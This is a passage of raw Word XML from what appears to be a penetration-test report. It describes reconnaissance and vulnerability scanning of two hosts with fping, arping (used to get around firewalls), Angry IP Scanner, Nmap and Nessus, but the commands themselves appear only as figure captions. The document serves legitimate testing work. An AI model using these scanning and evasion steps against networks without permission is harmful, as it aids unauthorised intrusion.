                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="09CE3001" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="00E15F8D">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>Fig</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> 3</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> – </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>fping command being used on Linux against the target address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C08E85" id="_x0000_s1028" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:94.3pt;margin-top:25.15pt;width:232.1pt;height:23.05pt;z-index:251664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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="09CE3001" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="00E15F8D">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>Fig</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> 3</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> – </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>fping command being used on Linux against the target address</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="006E48D6">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1180C672" wp14:editId="1449B911">
            <wp:extent cx="4135905" cy="258589"/>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5530" t="33307" r="43108" b="64318"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4257247" cy="266176"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5972EE05" w14:textId="77777777" w:rsidR="00E15F8D" w:rsidRDefault="00E15F8D" w:rsidP="006E48D6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="292229A8" w14:textId="77777777" w:rsidR="00727FDF" w:rsidRDefault="008F62DC" w:rsidP="00FF7CAE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Arp</w:t>
      </w:r>
      <w:r w:rsidR="00490BAF">
        <w:t>-p</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ing was used on Kali to </w:t>
      </w:r>
      <w:r w:rsidR="00CB581F">
        <w:t xml:space="preserve">evade any possible </w:t>
      </w:r>
      <w:r w:rsidR="009A6195">
        <w:t>fireworks</w:t>
      </w:r>
      <w:r w:rsidR="00727FDF">
        <w:t xml:space="preserve"> around the target address</w:t>
      </w:r>
      <w:r w:rsidR="009A6195">
        <w:t xml:space="preserve"> by using the arp protocol</w:t>
      </w:r>
      <w:r w:rsidR="00190C8A">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="001E3C1D">
        <w:t xml:space="preserve"> The command for this can be seen in Fig – 4.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EA4E4D4" w14:textId="77777777" w:rsidR="006E48D6" w:rsidRDefault="00E15F8D" w:rsidP="006E48D6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251666432" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="6B4D76BF" wp14:editId="15D178B9">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>center</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>418186</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3211830" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="7620" b="4445"/>
                <wp:wrapTopAndBottom/>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1830" cy="262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="1230DC7D" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="00E15F8D">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">4 </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">– </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>arping was also used to work around any possible firewalls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4D76BF" id="_x0000_s1029" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:32.95pt;width:252.9pt;height:20.65pt;z-index:2516664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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="1230DC7D" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="00E15F8D">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">4 </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">– </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>arping was also used to work around any possible firewalls</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="006E48D6">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="20110416" wp14:editId="47D68048">
            <wp:extent cx="3664303" cy="241396"/>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1974" t="24844" r="59941" b="73038"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3772590" cy="248530"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="36EB67D7" w14:textId="77777777" w:rsidR="00E15F8D" w:rsidRDefault="00E15F8D" w:rsidP="006E48D6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FFB803D" w14:textId="77777777" w:rsidR="00F901F4" w:rsidRDefault="00F901F4" w:rsidP="00F901F4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Angry IP scanner was used to scan the network</w:t>
      </w:r>
      <w:r w:rsidR="00190C8A">
        <w:t xml:space="preserve"> more intrusively</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to detect </w:t>
      </w:r>
      <w:r w:rsidR="001E3C1D">
        <w:t xml:space="preserve">and definitively prove </w:t>
      </w:r>
      <w:r>
        <w:t>what hosts are active</w:t>
      </w:r>
      <w:r w:rsidR="001E3C1D">
        <w:t>, see fig -5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E739BE5" w14:textId="77777777" w:rsidR="00CD05F3" w:rsidRDefault="004B786F" w:rsidP="00AF1CF0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251668480" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="75DE45E8" wp14:editId="6B2CD33C">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>center</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>778078</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2665095" cy="438785"/>
                <wp:effectExtent l="0" t="0" r="1905" b="0"/>
                <wp:wrapTopAndBottom/>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5095" cy="438785"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="20DE6F4F" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="00E15F8D">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>Fig</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> 5</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> – </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>Angry IP scanner was used by scanning the subnet 192.168.0.1 to 192.168.0.10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DE45E8" id="_x0000_s1030" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:61.25pt;width:209.85pt;height:34.55pt;z-index:2516684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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="20DE6F4F" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="00E15F8D">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>Fig</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> 5</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> – </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>Angry IP scanner was used by scanning the subnet 192.168.0.1 to 192.168.0.10</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="006E48D6">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4774CF9E" wp14:editId="674DB7C3">
            <wp:extent cx="3406639" cy="681487"/>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419" t="26295" r="57698" b="60551"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3472806" cy="694724"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="64308438" w14:textId="77777777" w:rsidR="00CD05F3" w:rsidRDefault="00425B82" w:rsidP="00425B82">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Advanced port scanner was used to scan any open ports on both servers (192.168.0.1 and 192.168.0.2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="344D4511" w14:textId="77777777" w:rsidR="00CD05F3" w:rsidRDefault="00CD05F3" w:rsidP="00CD05F3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="135F6629" w14:textId="77777777" w:rsidR="00190C8A" w:rsidRDefault="00190C8A" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="_Toc27518398"/>
      <w:r>
        <w:t>Vulnerability Scanning</w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
    </w:p>
    <w:p w14:paraId="4DDEE339" w14:textId="77777777" w:rsidR="00425B82" w:rsidRDefault="00425B82" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="001E3C1D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>NMAP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> was sued</w:t>
      </w:r>
      <w:r w:rsidR="001E3C1D">
        <w:t xml:space="preserve"> in Kali</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to perform a standard port TCP scan against 192.168.0.1 and 192.168.0.2</w:t>
      </w:r>
      <w:r w:rsidR="001E3C1D">
        <w:t xml:space="preserve"> the command can be seen in Fig - 6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ABFE19D" w14:textId="77777777" w:rsidR="00425B82" w:rsidRDefault="001E3C1D" w:rsidP="001E3C1D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="001E3C1D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251681792" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2B8FAC1A" wp14:editId="41CA2960">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>892454</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>405587</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3211830" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="7620" b="4445"/>
                <wp:wrapTopAndBottom/>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1830" cy="262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="046B4FF8" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="001E3C1D">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">6 </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>–</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> Nmap command used to perform the scan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8FAC1A" id="_x0000_s1031" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:70.25pt;margin-top:31.95pt;width:252.9pt;height:20.65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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="046B4FF8" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="001E3C1D">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">6 </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>–</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> Nmap command used to perform the scan</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00425B82">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="03A2301B" wp14:editId="001C2253">
            <wp:extent cx="3519405" cy="247015"/>
            <wp:effectExtent l="0" t="0" r="508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5821" t="21998" r="53572" b="75431"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3541218" cy="248546"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3F310F" w14:textId="77777777" w:rsidR="00190C8A" w:rsidRDefault="00190C8A" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">NMAP </w:t>
      </w:r>
      <w:r w:rsidR="00AF1CF0">
        <w:t xml:space="preserve">was used to perform several scans against the target network. A </w:t>
      </w:r>
      <w:r w:rsidR="00425B82">
        <w:t xml:space="preserve">standard scan using a vulnerability script was used to scan </w:t>
      </w:r>
      <w:r w:rsidR="00425B82" w:rsidRPr="00425B82">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>192.168.0.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4949CB04" w14:textId="77777777" w:rsidR="00425B82" w:rsidRDefault="00425B82" w:rsidP="00425B82">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2EFE25A1" w14:textId="77777777" w:rsidR="00425B82" w:rsidRDefault="00425B82" w:rsidP="00425B82">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Nessus was also used to perform a more in-depth scan against the target network. A simple server scan was performed against </w:t>
      </w:r>
      <w:r w:rsidRPr="00425B82">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>192.168.0.1 and 192.168.0.2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F66EC6" w14:textId="77777777" w:rsidR="006E72FA" w:rsidRDefault="00190C8A" w:rsidP="00743EC1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="1001" w:hanging="576"/>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc27518399"/>
      <w:r>
        <w:t xml:space="preserve">2.3 </w:t>
      </w:r>
      <w:bookmarkStart w:id="9" w:name="_Hlk27444972"/>
      <w:r w:rsidR="00E72EC2">
        <w:t>Enumerati</w:t>
      </w:r>
      <w:r w:rsidR="0087093D">
        <w:t>on</w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
    </w:p>
    <w:bookmarkEnd w:id="9"/>
    <w:p w14:paraId="1704813E" w14:textId="77777777" w:rsidR="007E1CB4" w:rsidRDefault="008B509C" w:rsidP="007E1CB4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Enumeration was performed by analyzing the results of the </w:t>
      </w:r>
      <w:r w:rsidR="007E1CB4" w:rsidRPr="007E1CB4">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Nmap</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidR="007E1CB4" w:rsidRPr="007E1CB4">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Nessus</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> scans, as well as the angry Ip and advanced port scanner scan</w:t>
      </w:r>
      <w:r w:rsidR="007E1CB4">
        <w:t>s. The results of which are present later in “</w:t>
      </w:r>
      <w:r w:rsidR="007E1CB4" w:rsidRPr="007E1CB4">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Results</w:t>
      </w:r>
      <w:r w:rsidR="007E1CB4">
        <w:t>”</w:t>
